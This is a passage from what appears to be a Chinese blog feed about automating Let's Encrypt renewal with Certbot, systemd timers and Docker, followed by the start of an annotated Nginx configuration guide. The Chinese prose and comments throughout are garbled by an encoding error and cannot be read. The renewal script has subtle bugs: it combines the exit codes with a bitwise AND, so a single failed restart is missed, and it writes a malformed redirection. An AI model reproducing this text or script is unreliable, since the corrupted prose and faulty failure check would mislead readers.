/path/to/&#123;fullchain.pem,privkey.pem&#125; /path/to/trojan &amp;&amp; \cp -rfL /path/to/&#123;fullchain.pem,privkey.pem&#125; /path/to/nginx/ssl</span><br><span class="line"></span><br><span class="line">    <span class="comment"># restart trojan and nginx</span></span><br><span class="line">    docker restart a767b9f9d9fa 833967a8990c 2&amp;&gt;/dev/null</span><br><span class="line">    trojanExitCode=$(docker inspect a767b9f9d9fa --format=<span class="string">'&#123;&#123;.State.ExitCode&#125;&#125;'</span>)</span><br><span class="line">    nginxExitCode=$(docker inspect 833967a8990c --format=<span class="string">'&#123;&#123;.State.ExitCode&#125;&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># åˆ¤æ–­ trojan ä¸ Nginx æ˜¯å¦é‡å¯æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span> [ $((<span class="variable">$trojanExitCode</span> &amp; <span class="variable">$nginxExitCode</span>)) -ne 0 ]; <span class="keyword">then</span></span><br><span class="line">        errLog=<span class="string">"Error! Trojan or nginx restart failed!"</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        errLog=<span class="string">"Congratulations! The certificate for shixinyu.space has been successfully renewed and expires on "</span><span class="variable">$&#123;expireAt#*=&#125;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    errLog=$(docker logs --since 1m 117ea491188d)</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‘é€é€šçŸ¥</span></span><br><span class="line"><span class="function"><span class="title">sendNotification</span></span> () &#123;</span><br><span class="line">    <span class="comment"># å‘é€å¾®ä¿¡é€šçŸ¥</span></span><br><span class="line">    wget -q <span class="string">"https://sc.ftqq.com/"</span><span class="variable">$errLog</span></span><br><span class="line">    <span class="comment"># å‘é€ IFTTT é€šçŸ¥</span></span><br><span class="line">    <span class="comment"># å‘é€é‚®ä»¶é€šçŸ¥</span></span><br><span class="line">    mail -s <span class="string">"è¯ä¹¦ç»­ç­¾ç»“æœ"</span> user@example.com &lt;&lt;&lt; <span class="variable">$errLog</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sendNotification</span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><blockquote><p>æ ¹æ® Certbot çš„<a href="https://certbot.eff.org/docs/using.html#re-creating-and-updating-existing-certificates" target="_blank" rel="noopener">ç»­ç­¾æ–‡æ¡£</a>ï¼Œå…¶ä¸­æä¾›äº†åŸºäºç»­ç­¾å‰çš„<code>--pre-hook</code>ï¼Œç»­ç­¾åçš„<code>--post-hook</code>ï¼Œç»­ç­¾æˆåŠŸçš„<code>--deploy-hook</code>ï¼Œå¯ä»¥å……åˆ†åˆ©ç”¨é’©å­å®ç°ä¸€äº›è‡ªåŠ¨åŒ–çš„ä¸œè¥¿ã€‚</p></blockquote><p>æœ‰äº†æ‰§è¡Œè„šæœ¬ä¹‹åï¼Œæˆ‘ä»¬å°±éœ€è¦è®¾ç½®ä¸‹å®šæ—¶å™¨äº†ï¼Œæˆ‘ä»¬é‡‡ç”¨ systemd çš„å®šæ—¶åŠŸèƒ½ï¼Œè€Œä¸æ˜¯ä¼ ç»Ÿçš„ crondã€‚å…³äº systemd çš„å®šæ—¶åŠŸèƒ½ï¼Œå¯ä»¥æŸ¥çœ‹<a href="https://www.ruanyifeng.com/blog/2018/03/systemd-timer.html" target="_blank" rel="noopener">Systemd å®šæ—¶å™¨æ•™ç¨‹</a> å’Œ <a href="https://www.cnblogs.com/operationhome/p/10720067.html" target="_blank" rel="noopener">Linux å®šæ—¶ä»»åŠ¡ crontab å’Œ Systemd Timer</a>ã€‚</p><p>æˆ‘ä»¬ç®€å•å­¦ä¹ ä¸€ä¸‹ï¼Œå°±æ˜ç™½äº† systemd çš„å®šæ—¶ä¹Ÿæ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨<code>/usr/lib/systemd/system</code>ç›®å½•ä¸‹åˆ›å»º<code>.service</code>å’Œ<code>.timer</code>æ–‡ä»¶å³å¯ï¼Œservice ä¸­åŒ…å«äº†æˆ‘ä»¬æ‰€éœ€è¦æ‰§è¡Œçš„è„šæœ¬ï¼Œ timer ä¸­åŒ…å«äº†æˆ‘ä»¬çš„è®¡åˆ’ä»»åŠ¡ã€‚</p><p><code>cert-renewal.service</code>æ–‡ä»¶å†…å®¹ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Cert Renewal</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/bin/bash /path/to/renewal.sh</span><br></pre></td></tr></table></figure><p><code>cert-renewal.timer</code>æ–‡ä»¶å†…å®¹ä¸º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Runs cert renewal every 85 days</span><br><span class="line"></span><br><span class="line">[Timer]</span><br><span class="line">OnUnitActiveSec=85d</span><br><span class="line">Persistent=<span class="literal">true</span></span><br><span class="line">Unit=cert-renewal.service</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>ç°åœ¨ä¸‡äº‹ä¿±å¤‡ï¼Œåªæ¬ ä¸œé£äº†ã€‚é…ç½®å¥½å®šæ—¶å™¨ä¹‹åï¼Œæˆ‘ä»¬ä¾æ¬¡æ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><p><code>systemctl daemon-reload</code> é‡è½½é…ç½®æ–‡ä»¶ï¼ŒæŸ¥çœ‹æœåŠ¡çŠ¶æ€<code>systemctl status cert-renewal.timer</code> </p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â— cert-renewal.timer - cert-renewal</span><br><span class="line"><span class="symbol">   Loaded:</span> loaded (<span class="meta-keyword">/usr/</span>lib<span class="meta-keyword">/systemd/</span>system/cert-renewal.timer; disabled; vendor preset: disabled)</span><br><span class="line"><span class="symbol">   Active:</span> inactive (dead)</span><br><span class="line"><span class="symbol">  Trigger:</span> n/a</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼Œå®šæ—¶ä»»åŠ¡å°šæœªæ¿€æ´»ï¼Œå¹¶ä¸”æ²¡æœ‰è®¾ç½®ä¸ºå¼€æœºè‡ªå¯ï¼Œæˆ‘ä»¬å…ˆæ‰§è¡Œ<code>systemctl enable cert-renewal.timer</code>è®¾ç½®ä¸ºå¼€æœºè‡ªå¯</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â— cert-renewal.timer - cert-renewal</span><br><span class="line"><span class="symbol">   Loaded:</span> loaded (<span class="meta-keyword">/usr/</span>lib<span class="meta-keyword">/systemd/</span>system/cert-renewal.timer; enabled; vendor preset: disabled)</span><br><span class="line"><span class="symbol">   Active:</span> inactive (dead)</span><br><span class="line"><span class="symbol">  Trigger:</span> n/a</span><br></pre></td></tr></table></figure><p>å†æ¿€æ´»ä»»åŠ¡<code>systemctl start cert-renewal.timer</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â— cert-renewal.timer - cert-renewal</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/cert-renewal.timer; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (elapsed) since Mon <span class="number">2020</span><span class="number">-06</span><span class="number">-01</span> <span class="number">07</span>:<span class="number">29</span>:<span class="number">37</span> UTC; <span class="number">43</span>s ago</span><br><span class="line">  Trigger: n/a</span><br></pre></td></tr></table></figure><p>è™½ç„¶ç°åœ¨ä»»åŠ¡å·²ç»æ¿€æ´»ï¼Œä½†æˆ‘ä»¬çœ‹åˆ°<code>Trigger: n/a</code>ï¼Œè¿™è¡¨æ˜ä»»åŠ¡å¹¶ä¸èƒ½æŒ‰ç…§é¢„æœŸæ¥å®šæ—¶æ‰§è¡Œï¼Œè¿™æ˜¯å› ä¸ºæˆ‘ä»¬çš„ä»»åŠ¡æ‰§è¡Œæ—¶é—´æ˜¯ç›¸å¯¹æ—¶é—´ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨æ‰§è¡Œä¸€æ¬¡ä»»åŠ¡<code>systemctl start cert-renewal.service</code>ï¼Œå¦‚æœæ‰‹åŠ¨æ‰§è¡Œä»»åŠ¡åä»æ²¡æœ‰å‡ºç°ä¸‹è¿°çŠ¶æ€ï¼Œå¯ä»¥å°è¯•<code>systemctl restart cert-renewal.timer</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â— cert-renewal.timer - cert-renewal</span><br><span class="line">   Loaded: loaded (/usr/lib/systemd/system/cert-renewal.timer; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (waiting) since Mon <span class="number">2020</span><span class="number">-06</span><span class="number">-02</span> <span class="number">07</span>:<span class="number">31</span>:<span class="number">57</span> UTC; <span class="number">59</span>s ago</span><br><span class="line">  Trigger: Mon <span class="number">2020</span><span class="number">-08</span><span class="number">-25</span> <span class="number">17</span>:<span class="number">32</span>:<span class="number">46</span> UTC; <span class="number">85</span>d left</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æˆ‘å®šæ—¶ä»»åŠ¡å°±è®¾ç½®å®Œæˆäº†ï¼Œç”¨<code>systemctl list-timers --all</code>æ¥æŸ¥çœ‹ä¸‹æ‰€æœ‰çš„ systemd çš„å®šæ—¶ä»»åŠ¡ï¼Œä¹‹åæ¯æ¬¡ä¿®æ”¹å®šæ—¶ä»»åŠ¡åï¼Œåªéœ€é‡è½½é…ç½®æ–‡ä»¶å³å¯ã€‚</p><blockquote><p>å¦‚æœè®¾ç½®å®šæ—¶ä»»åŠ¡åæ²¡æœ‰æœ€è¿‘çš„æ‰§è¡Œæ—¶é—´ä»¥åŠä¸‹æ¬¡æ‰§è¡Œæ—¶é—´ï¼Œå¯ä»¥å‚ç…§è¯¥<a href="https://www.youtube.com/watch?v=Oup21KLlpD8" target="_blank" rel="noopener">è§†é¢‘</a>å¤„ç†</p></blockquote><p>å¦‚æœéœ€è¦ç§»é™¤å®šæ—¶ä»»åŠ¡ï¼Œä¾æ¬¡æ‰§è¡Œï¼š</p><ol><li><code>systemctl disable test.timer</code></li><li><code>systemctl stop test.timer</code></li><li><code>sudo rm /usr/lib/systemd/system/example.*</code></li><li><code>systemctl daemon-reload</code></li><li><code>systemctl list-timers --all</code></li></ol><h2 id="3-6-åŠé”€è¯ä¹¦"><a href="#3-6-åŠé”€è¯ä¹¦" class="headerlink" title="3.6 åŠé”€è¯ä¹¦"></a>3.6 åŠé”€è¯ä¹¦</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo certbot revoke --<span class="built_in">test</span>-cert --cert-path /etc/letsencrypt/live/shixinyu.space/cert.pem</span><br></pre></td></tr></table></figure><p>å‚æ•°è¯´æ˜ï¼š</p><ul><li>ç”±äºæˆ‘ä»¬ç”³è¯·çš„æ˜¯æµ‹è¯•è¯ä¹¦ï¼Œå› æ­¤åœ¨åŠé”€è¯ä¹¦æ—¶åŒæ ·éœ€è¦ç”¨<code>--test-cert</code>æŒ‡æ˜åŠé”€æµ‹è¯•è¯ä¹¦</li></ul><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gf82rfu35bj30ob0b0js6.jpg" alt=""></p><h2 id="3-7-æ›´æ–°è¯ä¹¦åŸŸå"><a href="#3-7-æ›´æ–°è¯ä¹¦åŸŸå" class="headerlink" title="3.7 æ›´æ–°è¯ä¹¦åŸŸå"></a>3.7 æ›´æ–°è¯ä¹¦åŸŸå</h2><p>å¦‚æœæƒ³å°†<code>shixinyu.space</code>å’Œ<code>*.shixinyu.space</code>æ›´æ–°ä¸º<code>test.shixinyu.space</code>å’Œ<code>www.shixinyu.space</code>ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ certbot certonly --cert-name shixinyu.space \</span><br><span class="line">  -d test.shixinyu.space \</span><br><span class="line">  -d www.shixinyu.space</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> tls </tag>
            
            <tag> ssl </tag>
            
            <tag> certbot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç©è½¬Nginx</title>
      <link href="/post/play-with-nginx/"/>
      <url>/post/play-with-nginx/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/middle/007S8ZIlly1geg1g1k6yij30wi0iqgmo.jpg" alt=""></p><a id="more"></a><p>Nginx çš„ä½œç”¨ï¼š</p><ol><li>è´Ÿè½½å‡è¡¡(æ— çŠ¶æ€çš„æœåŠ¡å¯ä»¥è¢«è´Ÿè½½å‡è¡¡ï¼Œæœ‰çŠ¶æ€æœåŠ¡éœ€è¦è§£å†³çŠ¶æ€é—®é¢˜)</li><li>è™šæ‹Ÿä¸»æœºï¼ˆä¸€å°ç‰©ç†æœºå¯éƒ¨ç½²å¤šä¸ªç½‘ç«™ï¼‰</li><li>åå‘ä»£ç†</li><li>é™æ€ HTTP Server</li><li>æ”¯æŒè¾ƒé«˜çš„å¹¶å‘èƒ½åŠ›</li><li>é‡å†™ URI</li><li>é‰´æƒã€æµé‡æ§åˆ¶ã€è¯·æ±‚æ—¥å¿—<br>Nginx åœ¨æœ‰äº›æƒ…å†µä¸‹æ‰®æ¼”äº† API ç½‘å…³çš„è§’è‰²</li></ol><p>äº”ç§è´Ÿè½½å‡è¡¡ç­–ç•¥ï¼š</p><ul><li>è½®è¯¢ï¼ˆé»˜è®¤ï¼‰ ã€‚æ¯ä¸ªè¯·æ±‚æŒ‰æ—¶é—´é¡ºåºé€ä¸€åˆ†é…åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ï¼Œå¦‚æœåç«¯æœåŠ¡å™¨downæ‰ï¼Œèƒ½è‡ªåŠ¨å‰”é™¤ã€‚</li><li>æŒ‡å®šæƒé‡ã€‚æŒ‡å®šè½®è¯¢å‡ ç‡ï¼Œweightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œç”¨äºåç«¯æœåŠ¡å™¨æ€§èƒ½ä¸å‡çš„æƒ…å†µã€‚ </li><li>IP ç»‘å®šã€‚æ¯ä¸ªè¯·æ±‚æŒ‰è®¿é—®ipçš„hashç»“æœåˆ†é…ï¼Œè¿™æ ·æ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œå¯ä»¥è§£å†³sessionçš„é—®é¢˜ã€‚</li><li>fairï¼ˆç¬¬ä¸‰æ–¹ï¼‰ ã€‚æŒ‰åç«¯æœåŠ¡å™¨çš„å“åº”æ—¶é—´æ¥åˆ†é…è¯·æ±‚ï¼Œå“åº”æ—¶é—´çŸ­çš„ä¼˜å…ˆåˆ†é…ã€‚</li><li>url_hashï¼ˆç¬¬ä¸‰æ–¹ï¼‰ ã€‚æŒ‰è®¿é—®urlçš„hashç»“æœæ¥åˆ†é…è¯·æ±‚ï¼Œä½¿æ¯ä¸ªurlå®šå‘åˆ°åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨ï¼Œåç«¯æœåŠ¡å™¨ä¸ºç¼“å­˜æ—¶æ¯”è¾ƒæœ‰æ•ˆã€‚</li></ul><h1 id="Nginx-é…ç½®æ–‡ä»¶è¯¦è§£"><a href="#Nginx-é…ç½®æ–‡ä»¶è¯¦è§£" class="headerlink" title="Nginx é…ç½®æ–‡ä»¶è¯¦è§£"></a>Nginx é…ç½®æ–‡ä»¶è¯¦è§£</h1><p>åœ¨ Nginx é…ç½®æ–‡ä»¶ä¸­ï¼Œ<code>events</code>ä¸<code>http</code>æŒ‡ä»¤ä½äº<code>main</code>ä¸Šä¸‹æ–‡ä¸­ï¼Œ<code>server</code>ä½äº<code>http</code>ä¸­ï¼Œ<code>location</code>ä½äº<code>server</code>ä¸­ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"events"</span>:[],</span><br><span class="line">    <span class="attr">"http"</span>:&#123;</span><br><span class="line">        <span class="attr">"server"</span>:[</span><br><span class="line">            <span class="string">"location"</span>,</span><br><span class="line">            <span class="string">"location"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"server"</span>:[</span><br><span class="line">            <span class="string">"location"</span>,</span><br><span class="line">            <span class="string">"location"</span></span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¦ç»†é…ç½®æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å®šä¹‰Nginxè¿è¡Œçš„ç”¨æˆ·å’Œç”¨æˆ·ç»„</span></span><br><span class="line"><span class="comment">#user  nobody; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#nginxè¿›ç¨‹æ•°ï¼Œå»ºè®®è®¾ç½®ä¸ºç­‰äºCPUæ€»æ ¸å¿ƒæ•°ã€‚</span></span><br><span class="line"><span class="attribute">worker_processes</span>  <span class="number">1</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">#å…¨å±€é”™è¯¯æ—¥å¿—å®šä¹‰ç±»å‹ï¼Œ[ debug | info | notice | warn | error | crit ]</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  notice;</span></span><br><span class="line"><span class="comment">#error_log  logs/error.log  info;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿›ç¨‹æ–‡ä»¶</span></span><br><span class="line"><span class="comment">#pid        logs/nginx.pid;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å·¥ä½œæ¨¡å¼ä¸è¿æ¥æ•°ä¸Šé™</span></span><br><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="comment">#å•ä¸ªè¿›ç¨‹æœ€å¤§è¿æ¥æ•°ï¼ˆæœ€å¤§è¿æ¥æ•°=è¿æ¥æ•°*è¿›ç¨‹æ•°ï¼‰</span></span><br><span class="line">    <span class="attribute">worker_connections</span>  <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è®¾å®šhttpæœåŠ¡å™¨</span></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="comment">#æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨</span></span><br><span class="line">    <span class="attribute">include</span>       mime.types;</span><br><span class="line">    <span class="comment">#é»˜è®¤æ–‡ä»¶ç±»å‹</span></span><br><span class="line">    <span class="attribute">default_type</span>  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '</span></span><br><span class="line">    <span class="comment">#                  '$status $body_bytes_sent "$http_referer" '</span></span><br><span class="line">    <span class="comment">#                  '"$http_user_agent" "$http_x_forwarded_for"';</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#access_log  logs/access.log  main;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼ŒsendfileæŒ‡ä»¤æŒ‡å®šnginxæ˜¯å¦è°ƒç”¨sendfileå‡½æ•°æ¥è¾“å‡ºæ–‡ä»¶ï¼Œå¯¹äºæ™®é€šåº”ç”¨è®¾ä¸º onï¼Œå¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸ºoffï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦ï¼Œé™ä½ç³»ç»Ÿçš„è´Ÿè½½ã€‚æ³¨æ„ï¼šå¦‚æœå›¾ç‰‡æ˜¾ç¤ºä¸æ­£å¸¸æŠŠè¿™ä¸ªæ”¹ æˆoffã€‚</span></span><br><span class="line">    <span class="attribute">sendfile</span>        <span class="literal">on</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#é˜²æ­¢ç½‘ç»œé˜»å¡</span></span><br><span class="line">    <span class="comment">#tcp_nopush     on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#è®¾ç½®è´Ÿè½½å‡è¡¡è§„åˆ™</span></span><br><span class="line">    <span class="attribute">upstream</span> loadbalance &#123;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">10.20.30.40:80</span> weight=<span class="number">5</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">10.20.30.41:80</span> weight=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#é•¿è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ˜¯ç§’</span></span><br><span class="line">    <span class="comment">#keepalive_timeout  0;</span></span><br><span class="line">    <span class="attribute">keepalive_timeout</span>  <span class="number">65</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">#å¼€å¯gzipå‹ç¼©è¾“å‡º</span></span><br><span class="line">    <span class="comment">#gzip  on;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#è™šæ‹Ÿä¸»æœºçš„é…ç½®</span></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="comment">#ç›‘å¬ç«¯å£</span></span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#åŸŸåå¯ä»¥æœ‰å¤šä¸ªï¼Œç”¨ç©ºæ ¼éš”å¼€</span></span><br><span class="line">        <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#é»˜è®¤ç¼–ç </span></span><br><span class="line">        <span class="comment">#charset utf-8;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#å®šä¹‰æœ¬è™šæ‹Ÿä¸»æœºçš„è®¿é—®æ—¥å¿—</span></span><br><span class="line">        <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">            <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#error_page  404              /404.html;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># redirect server error pages to the static page /50x.html</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="attribute">error_page</span>   <span class="number">500</span> <span class="number">502</span> <span class="number">503</span> <span class="number">504</span>  /50x.html;</span><br><span class="line">        <span class="attribute">location</span> = /50x.html &#123;</span><br><span class="line">            <span class="attribute">root</span>   html;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># proxy the PHP scripts to Apache listening on 127.0.0.1:80</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    é…ç½®åå‘ä»£ç†</span></span><br><span class="line">        <span class="comment">#    proxy_pass   http://127.0.0.1;</span></span><br><span class="line">        <span class="comment">#    é…ç½®è´Ÿè½½å‡è¡¡</span></span><br><span class="line">        <span class="comment">#    proxy_pass   loadbalance;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ \.php$ &#123;</span></span><br><span class="line">        <span class="comment">#    root           html;</span></span><br><span class="line">        <span class="comment">#    fastcgi_pass   127.0.0.1:9000;</span></span><br><span class="line">        <span class="comment">#    fastcgi_index  index.php;</span></span><br><span class="line">        <span class="comment">#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span></span><br><span class="line">        <span class="comment">#    include        fastcgi_params;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># deny access to .htaccess files, if Apache's document root</span></span><br><span class="line">        <span class="comment"># concurs with nginx's one</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment">#location ~ /\.ht &#123;</span></span><br><span class="line">        <span class="comment">#    deny  all;</span></span><br><span class="line">        <span class="comment">#&#125;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># another virtual host using mix of IP-, name-, and port-based configuration</span></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    <span class="comment">#server &#123;</span></span><br><span class="line">    <span class="comment">#    listen       8000;</span></span><br><span class="line">    <span class="comment">#    listen       somename:8080;</span></span><br><span class="line">    <span class="comment">#    server_name  somename  alias  another.alias;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#    location / &#123;</span></span><br><span class="line">    <span class="comment">#        root   html;</span></span><br><span class="line">    <span class="comment">#        index  index.html 